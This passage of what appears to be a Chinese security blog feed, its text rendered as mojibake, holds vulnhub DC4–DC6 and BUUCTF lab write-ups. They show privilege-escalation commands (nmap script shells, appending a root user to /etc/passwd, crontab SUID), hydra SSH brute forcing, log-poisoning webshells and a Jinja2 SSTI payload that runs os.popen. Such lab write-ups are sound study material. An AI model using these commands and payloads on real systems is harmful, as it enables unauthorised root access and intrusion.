&gt;&gt; backups.sh</span><br><span class="line"> </span><br><span class="line">//è¿™é‡ŒåŸæœ¬ç›´æ¥ææƒåˆ°rootï¼Œä½†æ˜¯å¤±è´¥äº†</span><br><span class="line">sudo -u root ./backups.sh</span><br><span class="line"></span><br><span class="line">//è¿™é‡Œé€‰æ‹©åˆ°jensä¸­</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨rootç”¨æˆ·æ‰§è¡ŒæˆåŠŸçš„è¯  é‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥æ˜¯rootç”¨æˆ·äº†</p><p><img src="../images/image-20230413110135091.png" alt="image-20230413110135091"></p><p><img src="../images/image-20230413110241832.png" alt="image-20230413110241832"></p><p>åˆå‘ç°ä¸€ä¸ªæ— å¯†ç èƒ½æ‰§è¡Œçš„æ“ä½œ    <strong>nmap</strong></p><p>è¿™é‡ŒæŸ¥çœ‹ä¸€äº›å…³äºnmapçš„ææƒæ–¹æ³•ã€‚</p><p><img src="../images/image-20230413110341092.png" alt="image-20230413110341092"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27;&gt;getroot.sh</span><br><span class="line">sudo nmap --script=getroot.sh</span><br></pre></td></tr></table></figure><p><code>--script=script_name ä½¿ç”¨æ‰©å±•è„šæœ¬</code></p><p><img src="../images/image-20230413110654526.png" alt="image-20230413110654526"></p><p>ææƒæˆåŠŸ</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC5</title>
      <link href="/posts/ba2e977e.html"/>
      <url>/posts/ba2e977e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ€»ç»“ï¼šscreen-4.5.0<a href="https://so.csdn.net/so/search?q=ææƒ&amp;spm=1001.2101.3001.7020">ææƒ</a></p></blockquote><p>å…ˆæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230412152813358.png" alt="image-20230412152813358"></p><p>å‘ç°äº†ä¸€ä¸ª<strong>rpcbind</strong>çš„ä¸œè¥¿   å…ˆå»æŸ¥æŸ¥è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p><p><img src="../images/image-20230412152939958.png" alt="image-20230412152939958"></p><p>é¢˜ç›®è¿™é‡Œç»™äº†è¿™ä¸ªç«¯å£çš„æœåŠ¡çš„è¯ï¼Œè‚¯å®šæ˜¯ä¼šå­˜åœ¨æ¼æ´ï¼Œç­‰ä¼šæˆ‘ä»¬å¯ä»¥å»æŸ¥æŸ¥è¿™ä¸ªæœåŠ¡çš„æ¼æ´</p><p><img src="../images/image-20230412153058971.png" alt="image-20230412153058971"></p><p><img src="../images/image-20230412153151894.png" alt="image-20230412153151894"></p><p>é™¤äº†è¿™é‡Œä¹‹å¤–æ²¡æœ‰åˆ«çš„åœ°æ–¹å¯ä»¥å†™ä¸œè¥¿äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹å»æ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="../images/image-20230412153543069.png" alt="image-20230412153543069"></p><p>æ‰«åˆ°ä¸€äº›ç›®å½•</p><p>åªæœ‰è¿™ä¸ªç›®å½•æ˜¯æ–°çš„ <strong>thankyou.php</strong> </p><p>å…¶ä»–ç›®å½•å°±æ˜¯ç½‘ç«™ä¸Šçš„ç›®å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è®¿é—®è¿™ä¸ªç›®å½•</p><p><img src="../images/image-20230412153859581.png" alt="image-20230412153859581"></p><p>è¿™é‡Œçš„è¯æœ‰ä¸ªfileå‚æ•°å¯è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–</p><p><img src="../images/image-20230412153954317.png" alt="image-20230412153954317"></p><p>ç¡®å®å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–</p><p>è¿™é‡Œè¯ç”±äºè¿™ä¸ªç½‘ç«™æ˜¯nginxçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æƒ³ä¸€ä¸‹çœ‹èƒ½ä¸èƒ½è¿›è¡Œ<strong>æ—¥å¿—æ–‡ä»¶åŒ…å«</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.5.8/thankyou.php?file=/var/log/nginx/access.log  ##çœ‹æ—¥å¿—æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412154257695.png" alt="image-20230412154257695"></p><p>æˆåŠŸè¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹çœ‹èƒ½ä¸èƒ½å†™è¿›å»ä¸€å¥è¯æœ¨é©¬</p><p><img src="../images/image-20230412160439962.png" alt="image-20230412160439962"></p><p>æŠ“åŒ…åï¼Œè¿›è¡Œå†™ä¸€å¥è¯æœ¨é©¬</p><p><img src="../images/image-20230412162804378.png" alt="image-20230412162804378"></p><p>è¿™é‡Œè¿˜æœ‰ä¸€ç§å†™æ³•åœ¨è¿™ç¯‡æ–‡ç«    å°±æ˜¯åˆ©ç”¨å†™å…¥ä¸æ˜¯æ–‡ä»¶åï¼Œç„¶åæŠ¥é”™æŠŠå†…å®¹å†™å…¥<strong>error.log</strong>         <a href="https://blog.csdn.net/rpsate/article/details/119769130?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-119769130-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">error.logæ–¹æ³•çš„æ–‡ç« </a></p><p>ctfé¢˜ç›®æ˜¯åœ¨user-Agentå¤„å†™çš„ï¼Œä½†æ˜¯è¿™é‡Œå†™ä¸è¿›å»ï¼Œäºæ˜¯å°±åœ¨GETå¤„å†™</p><p>ç„¶åå°è¯•ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="../images/image-20230412162817855.png" alt="image-20230412162817855"></p><p>ç„¶<img src="../images/image-20230412163233853.png" alt="image-20230412163233853">åå°±æ˜¯æ‰“å¼€èšå‰‘ç»ˆç«¯è¿›è¡Œè®¿è°ˆshelläº†ï¼Œå› ä¸ºèšå‰‘ç»ˆç«¯ä¸å¥½ç”¨  ææƒä¹Ÿæä¸äº†</p><p>ç„¶åä½¿ç”¨<strong>pythonäº¤äº’shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™ä¸€æ­¥å°±æ˜¯å¼€å§‹ææƒäº† </p><p>è¿˜æ˜¯å°è¯•é‚£å‡ ç§æ–¹æ³•  suid  sudo å†…æ ¸æå–</p><p>suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412163453606.png" alt="image-20230412163453606"></p><p>å‘ç°äº†æœ‰ä¸ª<strong>screen-4.5.0</strong></p><p>ç„¶åå°±æ˜¯å…ˆåˆ©ç”¨<strong>searchsploit</strong>å·¥å…·æœç´¢ä¸€ä¸‹çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</p><p><img src="../images/image-20230412164801197.png" alt="image-20230412164801197"></p><p>å‘ç°ç¡®å®å­˜åœ¨æ¼æ´<strong>(æœ¬åœ°ææƒæ¼æ´)</strong></p><p>ç„¶åè¿›è¡Œæå–æ–‡ä»¶ä¸‹æ¥æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh  41154.sh</span><br><span class="line"> </span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41152.txt  41152.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412173201325.png" alt="image-20230412173201325"></p><p>æŒ‰ç…§è¿™ä¸ªé‡Œé¢ç»™çš„å‘½ä»¤å’Œæ–¹æ³•ç…§ç€åšå°±è¡Œäº†</p><p><strong>ç¬¬ä¸€æ­¥ï¼šå°†ä¸Šéƒ¨åˆ†çš„cè¯­è¨€ä»£ç å¦å­˜ä¸ºlibhax.cæ–‡ä»¶ ç„¶ågccç¼–è¯‘ï¼š<code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></strong></p><p>è¿™é‡Œå¾—æŠŠæ–‡ä»¶éƒ½æ”¾åˆ°tmpæ–‡ä»¶å¤¹é‡Œ</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128687469?spm=1001.2014.3001.5502">wp1 </a>    <a href="https://blog.csdn.net/Aluxian_/article/details/123726473?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-123726473-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">wp2</a></p><p>çœ‹ç€è·Ÿç€æå°±è¡Œäº†  è¿™é‡Œå°±ä¸è¯¦ç»†å†™äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC4</title>
      <link href="/posts/cd29a7e8.html"/>
      <url>/posts/cd29a7e8.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ç ´ï¼Œteeheeææƒ</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230411234310796.png" alt="image-20230411234310796"></p><p>å‘ç°ä¸¤ä¸ªç«¯å£</p><p>ä¸€ä¸ªsshç«¯å£  ä¸€ä¸ª80ç«¯å£</p><p><img src="../images/image-20230411234348802.png" alt="image-20230411234348802"></p><p>å‘ç°å°±æ˜¯ä¸ªç®€å•çš„ç™»å½•ï¼Œæ²¡æœ‰æ¡†æ¶çš„</p><h3 id="å¯†ç çˆ†ç ´"><a href="#å¯†ç çˆ†ç ´" class="headerlink" title="å¯†ç çˆ†ç ´"></a>å¯†ç çˆ†ç ´</h3><p>è¿™é‡Œå‘ç°æœ‰ä¸€ä¸ªç™»å½•çš„ç½‘é¡µï¼Œè¿™é‡Œé¦–å…ˆæˆ‘ä»¬å°è¯•å°è¯•ä¸€äº›æ™®é€šçš„å¼±å£ä»¤ï¼Œè¿™é‡Œæ²¡æœ‰æˆåŠŸï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨burpæ¥çˆ†ç ´adminå¯†ç ã€‚</p><p><img src="../images/image-20230412090343198.png" alt="image-20230412090343198"></p><p>çˆ†ç ´å‡ºè¿™ä¸ªå¼±å¯†ç </p><p><strong>happy</strong></p><p>äºæ˜¯å°±å°è¯•è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230412090502638.png" alt="image-20230412090502638"></p><p>æˆåŠŸç™»å½•å</p><p><img src="../images/image-20230412090542056.png" alt="image-20230412090542056"></p><p>å‘ç°å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤çš„æ‰§è¡Œ</p><p>äºæ˜¯å°±æƒ³çš„æ˜¯è¿›è¡Œåå¼¹shell</p><p><img src="../images/image-20230412090950140.png" alt="image-20230412090950140"></p><p>åå¼¹shellæˆåŠŸå</p><p>è¿™é‡Œçš„ç•Œé¢å¤ªéš¾çœ‹ï¼Œè¿›è¡Œ<strong>pythonäº¤äº’shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412091124299.png" alt="image-20230412091124299"></p><p>è¿›è¡Œhomeç›®å½•ï¼Œå‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p><p>è¿›å…¥jimç›®å½•ï¼Œå‘ç°æœ‰å¯†ç å¤‡ä»½ï¼Œäºæ˜¯<strong>çŒœæµ‹å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¯†ç å¤‡ä»½æ¥è¿›è¡Œçˆ†ç ´jimçš„sshå¯†ç </strong></p><p><img src="../images/image-20230412091220929.png" alt="image-20230412091220929"></p><p><img src="../images/image-20230412091518236.png" alt="image-20230412091518236"></p><p><strong>åªæœ‰çŸ­çŸ­çš„ä¸€äº›å¯†ç </strong>    å­˜åˆ°kaliä¸Šï¼Œç­‰ä¼šè¿›è¡Œçˆ†ç ´</p><p>äºæ˜¯ä½¿ç”¨sshçˆ†ç ´å·¥å…·å¼€å§‹è¿›è¡Œçˆ†ç ´</p><p><a href="https://xie.infoq.cn/article/e82e7a36d35ad78783ef4a1b6">ã€Kaliã€‘ä¸­å¯†ç æš´åŠ›ç ´è§£å·¥å…· hydra çš„ä½¿ç”¨</a></p><p><strong>ftp ssh teamspeak  pop3</strong>  éƒ½å¯ä»¥è¿›è¡Œçˆ†ç ´</p><p>ä¸Šé¢çš„æ–‡ç« é‡Œè¿˜æ­é…ç€ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·</p><p><strong>crunch</strong>    ä½†æ˜¯åªèƒ½ç”Ÿæˆçº¯æ•°å­—çš„å¯†ç </p><p>ä½¿ç”¨<strong>hydra -h</strong>æ…¢æ…¢çœ‹å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P 2.txt ssh://192.168.142.131</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412145145617.png" alt="image-20230412145145617"></p><p>è·å¾—å¯†ç ä¸ºï¼š<code>jibril04</code> ç™»å…¥ssh</p><p><img src="../images/image-20230412145239375.png" alt="image-20230412145239375"></p><p>ç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230412145302805.png" alt="image-20230412145302805"></p><p>è·å¾—æç¤º</p><p>ç™»å…¥æç¤ºï¼š<code>You have mail</code> è®©æˆ‘ä»¬çœ‹é‚®å¯„ <code>cd/var/mail</code> å‘ç°äº†jimé‡Œé¢æœ‰ä¸ªCharleså¯†ç ï¼š<code>^xHhA&amp;hvim0y</code> å°è¯•åˆ‡æ¢ç™»å…¥</p><p><img src="../images/image-20230412145604425.png" alt="image-20230412145604425"></p><p>åˆ°æœ€åä¸€æ­¥äº†</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿˜æ˜¯å…ˆå°è¯•ä¸€ä¸‹suidå’Œsudo å†…æ ¸ææƒ</p><p><img src="../images/image-20230412145805562.png" alt="image-20230412145805562"></p><p>å‘ç°ä¸ªæ²¡å¯†ç çš„èƒ½ä»¥rootæƒé™æ‰§è¡Œçš„å‘½ä»¤</p><p><img src="../images/image-20230412150005731.png" alt="image-20230412150005731"></p><p><strong>passwdçš„æ ¼å¼ï¼š[â½¤æˆ·å]ï¼š[å¯†ç ]ï¼š[UID]ï¼š[GID]ï¼š[â¾ä»½æè¿°]ï¼š[ä¸»â½¬å½•]ï¼š[ç™»å½•shell]</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;axb::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>uidä¸ºé›¶    â€”â€”&gt;   rootç”¨æˆ·</strong></p><p><img src="../images/image-20230412151531467.png" alt="image-20230412151531467"></p><p>è¿™é‡Œæœ‰ä¸ªå°å‘å°±æ˜¯åˆ‡æ¢æˆcharlesç”¨æˆ·çš„æ—¶å€™ï¼Œä¸èƒ½ç”¨sshç™»å½•æ¥è¿›è¡Œåˆ‡æ¢ï¼Œå¾—ç”¨ä¹‹ç™»å½•çš„jimç”¨æˆ·ï¼Œä½¿ç”¨suåˆ‡æ¢   ä¸ç„¶ææƒä¸æˆåŠŸ</p><p><strong>æ–¹æ³•äºŒ</strong></p><p><strong>2.åˆ›å»ºå®šæ—¶ä»»åŠ¡ç»™ææƒ</strong><br>çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„åšå®¢ï¼Œå‘ç°æ˜¯è¿™æ ·çš„ï¼Œåˆ›å»ºä¸€ä¸ªå®šæ—¶äººç‰©ç„¶åç»™/bin/shèµ‹äºˆSUIDçš„æƒé™ï¼Œç„¶åç”¨teeheeå‘½ä»¤è¿™ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œå†™åˆ°/etc/crontabé‡Œé¢å»ã€‚</p><p>å‘½ä»¤å¦‚ä¸‹ã€‚</p><p>echo â€œ<em> </em> <em> </em> * root chmod 4777 /bin/shâ€ | sudo teehee -a /etc/crontab<br>1<br>crontabå‘½ä»¤è¯¦è§£å¯ä»¥ç™¾åº¦æŸ¥èµ„æ–™ã€‚</p><p>è¿™æ ·ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°é‡Œé¢è¾“å…¥/bin/shå°±å¯ä»¥äº†ï¼Œå¦‚ä¸‹å›¾ææƒæˆåŠŸã€‚</p><p><img src="../images/image-20230412151903053.png" alt="image-20230412151903053"></p><p><strong>æ€»ç»“</strong></p><p>è¿˜æœ‰å¼±å£ä»¤å¯†ç çˆ†ç ´</p><p>å­¦ä¹ äº†hydraçš„ä½¿ç”¨å’Œteeheeææƒ</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— æ•ŒRCE-trick</title>
      <link href="/posts/d13cd9bb.html"/>
      <url>/posts/d13cd9bb.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/q20010619/article/details/109206728">CTFä¸­å­—ç¬¦é•¿åº¦é™åˆ¶ä¸‹çš„å‘½ä»¤æ‰§è¡Œ rce(7å­—ç¬¦5å­—ç¬¦4å­—ç¬¦)æ±‡æ€»</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE é™åˆ¶é•¿åº¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-åˆ·é¢˜è®°å½•-ç¬¬ä¸‰é¡µ</title>
      <link href="/posts/dca6c0ad.html"/>
      <url>/posts/dca6c0ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230411195501929.png" alt="image-20230411195501929"></p><p><img src="../images/image-20230411195551367.png" alt="image-20230411195551367"></p><p>æç¤ºäº†ï¼Œflaskç®—pin</p><p><img src="../images/image-20230411195641629.png" alt="image-20230411195641629"></p><p>åˆ©ç”¨è§£å¯†çš„æ—¶å€™æŠ¥é”™ï¼Œå¾—å‡ºä¸€äº›ä¿¡æ¯</p><p><img src="../images/image-20230411195756528.png" alt="image-20230411195756528"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><ol><li><p>æ ¹æ®ä»£ç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬åŠ å¯†åçš„ä»£ç ç»è¿‡wafåå°±ä¼šè¢«ç›´æ¥æ¸²æŸ“ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨sstiäº†ã€‚</p></li><li><p>æˆ‘ä»¬è¿›è¡Œç»•è¿‡æ¥å°½å¯èƒ½çš„è¾¾åˆ°å‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºæœ‰wafï¼Œæˆ‘ä»¬å¯¹å¯èƒ½è¿›è¡Œäº†è¿‡æ»¤çš„å•è¯ä½¿ç”¨<strong>æ‹†åˆ†å…³é”®è¯è¿›è¡Œç»•è¿‡</strong></p><p><strong>å°±æ˜¯è¾“å…¥base64åŠ å¯†åçš„å€¼ï¼Œç„¶åè¿›è¡Œè§£å¯†ï¼Œè§£å¯†åç»•è¿‡èƒ½ç»•è¿‡wafï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œæ¨¡æ¿æ³¨å…¥äº†</strong></p></li></ol><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span>](<span class="string">&#x27;__impor&#x27;</span>+<span class="string">&#x27;t__&#x27;</span>+<span class="string">&#x27;(&quot;o&#x27;</span>+<span class="string">&#x27;s&quot;)&#x27;</span>+<span class="string">&#x27;.pope&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;(&quot;cat /this_is_the_flag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200146505.png" alt="image-20230411200146505"></p><p>è§£å¯†åå‘ç°flagä½ç½®</p><p>ç›´æ¥catçš„è¯ä¼šä¸ç»™è¯»</p><p><img src="../images/image-20230411200248871.png" alt="image-20230411200248871"></p><p>ç„¶åå°è¯•ä¸€ä¸‹æ–°çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200430933.png" alt="image-20230411200430933"></p><p><strong>è¿™é“é¢˜æœ‰ä¸¤ä¸ªè§£</strong></p><p><a href="https://blog.csdn.net/weixin_44214568/article/details/124125565">ç¬¬ä¸€ç§è§£ï¼Œä¸éœ€è¦ç®—pinï¼Œè¿™æ˜¯ä¸€ç§æ–°çš„sstiè¯»å–æ–‡ä»¶çš„æ–¹æ³•(å¯ä»¥å½“ä½œç§¯ç´¯)</a></p><p><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">ç¬¬äºŒç§è§£ï¼Œflaskç®—pinï¼Œä¹‹å‰åšçš„é¢˜æœ‰å†™è¿‡</a></p><p><img src="../images/image-20230411200822462.png" alt="image-20230411200822462"></p><p><strong>è¿™æ ·ä¹Ÿèƒ½è°ƒå‡ºæ¥ï¼Œä¹‹å‰å­¦åˆ°çš„ç§¯ç´¯</strong></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç®€å•çš„æ— æ•°å­—å­—æ¯rce  åŠ   é™åˆ¶é•¿åº¦</p><p><a href="https://www.cnblogs.com/Dreamerwd/p/15421284.html">è¿™ç¯‡æ–‡ç« è®²äº†å°±æ˜¯assert()å‡½æ•°çš„ä½¿ç”¨å’Œå¦‚ä½•ç»•è¿‡disable_functionè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</a></p><p><strong>é€šè¿‡ç¯å¢ƒå˜é‡LD_PRELOAD+mailåŠ«æŒsoæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong>     å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œç»•è¿‡</p><p>å½“ç„¶èšå‰‘ä¹Ÿæœ‰è¿™ä¸ªåŠŸèƒ½  å°±æ˜¯ç»•è¿‡<strong>disable_function</strong>   æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><strong>å°±æ˜¯ä½¿ç”¨èšå‰‘çš„è¿™ä¸ªåŠŸèƒ½æ¥è¿›è¡Œç»•è¿‡</strong></p><p><img src="../images/image-20230411214728985.png" alt="image-20230411214728985"></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" 